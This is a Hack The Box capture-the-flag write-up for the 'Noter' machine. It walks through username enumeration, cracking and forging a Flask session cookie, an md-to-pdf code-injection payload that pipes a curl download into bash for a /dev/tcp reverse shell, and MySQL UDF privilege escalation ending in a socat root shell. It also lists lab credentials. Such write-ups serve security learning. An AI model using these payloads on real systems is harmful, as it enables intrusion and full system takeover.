---
title: "HTB Writeup: Noter [Medium]"
summary: "A medium rated box, with flask session manipulation and privilege escalation trough mysql."
tags: ["htb", "writeup", "medium"]
#externalUrl: ""
showSummary: true
date: 2023-01-19
draft: false
---
# Noter
## Reconnaissance
### Nmap
nmap scans three open ports ftp(21), ssh(22) and http_alt(5000) 
```
┌──(kali㉿kali)-[~/htb/noter]
└─$ sudo nmap -A -T4 -sC -sV -p- 10.10.11.160
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-18 15:22 CEST
Nmap scan report for 10.10.11.160
Host is up (0.022s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)
|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)
|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title: Noter
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=6/18%OT=21%CT=1%CU=35954%PV=Y%DS=2%DC=T%G=Y%TM=62ADD1A
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M5T11NW7%O5=M505ST11
OS:NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   21.75 ms 10.10.14.1
2   21.93 ms 10.10.11.160

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.47 seconds

```
```
┌──(kali㉿kali)-[~/htb/noter]
└─$ sudo nmap -sV -sU 10.10.11.160
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-18 15:30 CEST
Stats: 0:09:02 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 54.28% done; ETC: 15:46 (0:07:37 remaining)
Nmap scan report for noter.htb (10.10.11.160)
Host is up (0.023s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT   STATE         SERVICE VERSION
68/udp open|filtered dhcpc

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1107.84 seconds

```
```
┌──(kali㉿kali)-[~]
└─$ nmap --script ftp-* -p 21 noter.htb                                                                                             130 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-18 15:34 CEST
Nmap scan report for noter.htb (10.10.11.160)
Host is up (0.023s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 3735 guesses in 601 seconds, average tps: 6.1

Nmap done: 1 IP address (1 host up) scanned in 601.70 seconds
```
The webserver running on port ```5000``` redirects to ```noter.htb```. I've create an entry in my `/etc/hosts` file.
```
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts                                                                                                                    1 ⨯
127.0.0.1       localhost
127.0.1.1       kali
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.10.11.160    noter.htb
```


## Footholding
### Taking Notes

I've registered two accounts on the Noter application located at http://noter.htb:5000/ and started to create notes.

There are a few Takeaways:
1. The numbers assigned to the notes in the URL query parameter are **consecutive**.
 2. The first assigned note number to my notes was **#3**, indicating that note **#1** and **#2** must exist.
3. We can't access note **#1** and **#2** - indicating, that some session handling/authorization is in place.

### Login Form User Enumeration
Failed logins on the webpage with ```invalid``` usernames throws an```Invalid credentials``` erro and failed login with a ```valid``` username throws ```Invalid login``` error.


With ```wfuzz``` we can create a simple fuzzer that enumerates valid usernames:
```
┌──(kali㉿kali)-[~/htb/noter]
└─$ wfuzz -c -z file,/usr/share/seclists/Usernames/Names/names.txt --ss "Invalid login" -d "username=FUZZ&password=anything" http://noter.htb:5000/login 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://noter.htb:5000/login
Total requests: 10177

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                  
=====================================================================

000001208:   200        68 L     110 W      2030 Ch     "blue"                                                                   

Total time: 66.81313
Processed Requests: 10177
Filtered Requests: 10176
Requests/sec.: 152.3203
```
| Username |
| --- |
| blue |

### Cookie Tampering - Session Manipulation
```nmap``` indicated that the tech stack has ```Werkzeug``` running - maybe we can crack the session cookie and manipulate our session via ```Flask Cookie Re-Signing```.

For the manipulation process I've used ```Flask-Unsign```: https://github.com/Paradoxis/Flask-Unsign

First, we decode our own session cookie, to inspect the contents:
```
┌──(kali㉿kali)-[~/htb/noter]
└─$ /home/kali/.local/bin/flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoieWVlYiJ9.Yq3VSA.PMpvwDdfnW8BPBZeBSgir9H32tQ'
{'logged_in': True, 'username': 'yeeb'}
```

Bruteforcing the siging key with ```rockyou.txt```:
```
┌──(kali㉿kali)-[~/htb/noter]
└─$ /home/kali/.local/bin/flask-unsign  --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoieWVlYiJ9.Yq3VSA.PMpvwDdfnW8BPBZeBSgir9H32tQ' --no-literal-eval
[*] Session decodes to: {'logged_in': True, 'username': 'yeeb'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 17024 attempts
b'secret123'
```

Forging a new cookie/session token for the ```blue``` user account:

```
┌──(kali㉿kali)-[~/htb/noter]
└─$ /home/kali/.local/bin/flask-unsign  --sign  --legacy --secret 'secret123' --cookie "{'logged_in': True, 'username': 'blue'}"
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yq-RzA.zCyvt_2gliXzCuiWJFTsyka_2F4
```
By editing and switching out the session cookie in chrome's cookie storage or in Burp directly, we now can sign in and access the notes of ```blue```.

### Notes
#### Note #1 
Noter Premium Membership
Written by ftp_admin on Mon Dec 20 01:52:32 2021

```

Hello, Thank you for choosing our premium service. Now you are capable of
doing many more things with our application. All the information you are going
to need are on the Email we sent you. By the way, now you can access our FTP
service as well. Your username is 'blue' and the password is 'blue@Noter!'.
Make sure to remember them and delete this.  
(Additional information are included in the attachments we sent along the
Email)  
  
We all hope you enjoy our service. Thanks!  
  
ftp_admin
```

#### Note #2

```
* Delete the password note  
* Ask the admin team to change the password
```

| Username  |  Password |
|---|---|
| blue  | blue@Noter!  |
| ftp_admin  |   |

### FTP Access

With the user credentials from the notes, we can login on FTP service as ```blue``` and download the ```passwordpolicy.pdf```.

With the password policy we can craft the default password for the ```ftp_admin``` user and download ```app backups``` from the FTP share.
| Username  |  Password |
|---|---|
| ftp_admin  |  ftp_admin@Noter! |


### Application Backups

From the backup files we can extract some DB credentials:
| Username  |  Password |
|---|---|
| root  |  Nildogg36 |

The second backup contains a vulnerable function, which we can use to gain code execution.

```
@app.route('/export_note_remote', methods=['POST'])
@is_logged_in
def export_note_remote():
    if check_VIP(session['username']):
        try:
            url = request.form['url']

            status, error = parse_url(url)

            if (status is True) and (error is None):
                try:
                    r = pyrequest.get(url,allow_redirects=True)
                    rand_int = random.randint(1,10000)
                    command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}"
                    subprocess.run(command, shell=True, executable="/bin/bash")

                    if os.path.isfile(attachment_dir + f'{str(rand_int)}.pdf'):

                        return send_file(attachment_dir + f'{str(rand_int)}.pdf', as_attachment=True)

                    else:
                        return render_template('export_note.html', error="Error occured while exporting the !")

                except Exception as e:
                    return render_template('export_note.html', error="Error occured!")


            else:
                return render_template('export_note.html', error=f"Error occured while exporting ! ({error})")
            
        except Exception as e:
            return render_template('export_note.html', error=f"Error occured while exporting ! ({e})")

    else:
        abort(403)
```

The function calls ```md-to-pdf``` which has a ```code injection vulerability``` tracked at https://github.com/simonhaenisch/md-to-pdf/issues/99
```package-lock.json``` confirms that the package version is indeed vulnerable.
```
"md-to-pdf": {
      "version": "4.1.0",
      "resolved": "https://registry.npmjs.org/md-to-pdf/-/md-to-pdf-4.1.0.tgz",
      "integrity": "sha512-5CJVxncc51zkNY3vsbW49aUyylqSzUBQkiCsB0+6FlzO/qqR4UHi/e7Mh8RPMzyqiQGDAeK267I3U5HMl0agRw==",
        "requires": {
        "arg": "5.0.0",
        "chalk": "4.1.1",
        "chokidar": "3.5.2",
        "get-port": "5.1.1",
        "get-stdin": "8.0.0",
        "gray-matter": "4.0.3",
        "highlight.js": "11.0.1",
        "iconv-lite": "0.6.3",
        "listr": "0.14.3",
        "marked": "2.1.3",
        "puppeteer": ">=8.0.0",
        "semver": "7.3.5",
        "serve-handler": "6.1.3"
      }
```

We can leverage  the code injection vulnerably  to a ```reverse shell``` by hosting a malicous ```.md``` file on a webserver and triggering the ``` Export directly from cloud``` function from the ```Noter``` webserver. 

I created a little execution chain to make the payload easier editable.

Skeleton exploit:
```---js\n((require("child_process")).execSync("<PAYLOAD>"))\n---RCE```

Create a malicious mardown file:
```
┌──(kali㉿kali)-[~/htb/noter/serve]
└─$ cat exploit.md 
---js\n((require("child_process")).execSync("curl 10.10.14.7/shell.sh | bash"))\n---RCE

┌──(kali㉿kali)-[~/htb/noter/serve]
└─$ cat shell.sh  
sh -i >& /dev/tcp/10.10.14.7/8081 0>&1
```

Host the file on a webserver:
```
┌──(kali㉿kali)-[~/htb/noter/serve]
└─$ python -m updog -p 80
[+] Serving /home/kali/htb/noter/serve...
 * Running on all addresses.
   WARNING: This is a development server. Do not use it in a production deployment.
 * Running on http://192.168.178.89:80/ (Press CTRL+C to quit)
10.10.11.160 - - [19/Jun/2022 23:51:02] "GET /exploit.md HTTP/1.1" 200 -
10.10.11.160 - - [19/Jun/2022 23:51:03] "GET /shell.sh HTTP/1.1" 200 -
```

Start a little reverse shell handler:
```
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lvnp 8081
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::8081
Ncat: Listening on 0.0.0.0:8081
```

### User flag
```
cat /home/svc/user.txt
[REDACTED]
svc@noter:~$ 
```

## Privilege Escalation

Starting off with Linpeas enumeration.
Hosting linpeas on a server:
```
┌──(kali㉿kali)-[~/htb/noter/serve]
└─$ wget https://github.com/carlospolop/PEASS-ng/releases/download/20220619/linpeas.sh
--2022-06-20 00:02:20--  https://github.com/carlospolop/PEASS-ng/releases/download/20220619/linpeas.sh
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/78b5baad-2d4d-4c28-8f75-9be4267f5aca?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220619%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20220619T195932Z&X-Amz-Expires=300&X-Amz-Signature=458e4ebc68fade3310b414a23f7687f955f9b227163aac4ee86349b53b0fc07e&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=165548191&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream [following]
--2022-06-20 00:02:20--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/78b5baad-2d4d-4c28-8f75-9be4267f5aca?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220619%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20220619T195932Z&X-Amz-Expires=300&X-Amz-Signature=458e4ebc68fade3310b414a23f7687f955f9b227163aac4ee86349b53b0fc07e&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=165548191&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.108.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 776785 (759K) [application/octet-stream]
Saving to: ‘linpeas.sh’

linpeas.sh                             100%[============================================================================>] 758.58K  --.-KB/s    in 0.08s   

2022-06-20 00:02:20 (9.54 MB/s) - ‘linpeas.sh’ saved [776785/776785]

                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/noter/serve]
└─$ python -m updog -p 80
[+] Serving /home/kali/htb/noter/serve...
 * Running on all addresses.
   WARNING: This is a development server. Do not use it in a production deployment.
 * Running on http://192.168.178.89:80/ (Press CTRL+C to quit)
```

Downloading linpeas on the client:
```
wget 10.10.14.7/linpeas.sh
--2022-06-19 20:00:45--  http://10.10.14.7/linpeas.sh
Connecting to 10.10.14.7:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 776785 (759K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 758.58K  2.75MB/s    in 0.3s    

2022-06-19 20:00:45 (2.75 MB/s) - ‘linpeas.sh’ saved [776785/776785]


chmod +x linpeas.sh
chmod +x linpeas.sh


./linpeas.sh
```

Nothing major in the output, but since we got mysql credentials from the backup file, we should head down that route first.
### Mysql Privilege Escalation
I've found this Medium post that describes a technique to escalate privileges by utilizing ```User Defined Functions``` in mysql.

https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf


For the exloit we need to enumerate the plugin directory that the ```mariadb``` is currenly using:

```
show variables like '%plugin%';
+-----------------+---------------------------------------------+
| Variable_name   | Value                                       |
+-----------------+---------------------------------------------+
| plugin_dir      | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ |
| plugin_maturity | gamma                                       |
+-----------------+---------------------------------------------+
2 rows in set (0.001 sec)
```

The exploit is also hosted on ```exploitdb```:
https://www.exploit-db.com/exploits/1518


```
pwd
/home/svc
wget 10.10.14.7/1518.c
wget 10.10.14.7/1518.c
--2022-06-19 21:39:29--  http://10.10.14.7/1518.c
Connecting to 10.10.14.7:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3281 (3.2K) [text/x-csrc]
Saving to: ‘1518.c’

1518.c              100%[===================>]   3.20K  --.-KB/s    in 0.001s  

2022-06-19 21:39:29 (4.85 MB/s) - ‘1518.c’ saved [3281/3281]

mv 1518.c raptor_udf2.c
mv 1518.c raptor_udf2.c
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
mysql -u root -p
Enter password:
Nildogg36
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/home/svc/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select do_system('socat TCP:10.10.14.7:8083 EXEC:sh');
```

## root
By triggering the ```do_system``` function in ```mysql``` we now can execute shell commands and spawn back a reverse shell:
```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8083  
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::8083
Ncat: Listening on 0.0.0.0:8083
Ncat: Connection from 10.10.11.160.
Ncat: Connection from 10.10.11.160:39172.
sh: 0: can't access tty; job control turned off
$ whoami
root

```